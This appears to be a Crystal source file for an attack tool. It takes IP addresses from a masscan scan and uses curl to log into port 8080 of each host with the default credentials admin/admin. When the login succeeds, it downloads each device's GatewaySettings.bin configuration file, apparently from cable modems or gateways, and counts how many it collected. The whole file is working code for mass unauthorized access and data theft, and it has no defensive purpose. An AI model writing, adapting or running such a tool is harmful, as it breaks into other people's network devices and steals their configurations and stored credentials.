module Coscan
  class LastLine
    class_property username = "admin"
    class_property password = "admin"

    @ips = [] of String
    @ch = Channel(String).new
    @counter = 0

    def initialize
      puts "Requesting adresses..."
      search_ips
      analyze_ips
      @ips.each do
        puts @ch.receive
      end
      puts "#{@counter} bin files downloaded!".colorize(:yellow)
    end

    def search_ips
      @ips = File.read_lines("tmp/#{Masscan.name}.ips")
    end

    def analyze_ips
      @ips.each do |ip|
        spawn process(ip)
      end
    end

    def process(ip)
      msg = "#{ip} requested, binary found: "
      status = "false".colorize(:red).to_s
      `curl -s -d "loginUsername=#{@@username}&loginPassword=#{@@password}" -m 5 -D tmp/#{ip}.header http://#{ip}:8080/goform/login > /dev/null`
      if File.read("tmp/#{ip}.header").includes? "RgConnect.asp"
        `curl -s -m 5 -o tmp/#{ip}.bin http://#{ip}:8080/GatewaySettings.bin`
        if File.exists?("tmp/#{ip}.bin")
          `mv tmp/#{ip}.bin bin/#{ip}.bin`
          status = "true".colorize(:green).to_s
          @counter += 1
        end
      end
      @ch.send "#{msg} #{status}"
    end

    def self.start
      LastLine.new
    end
  end
end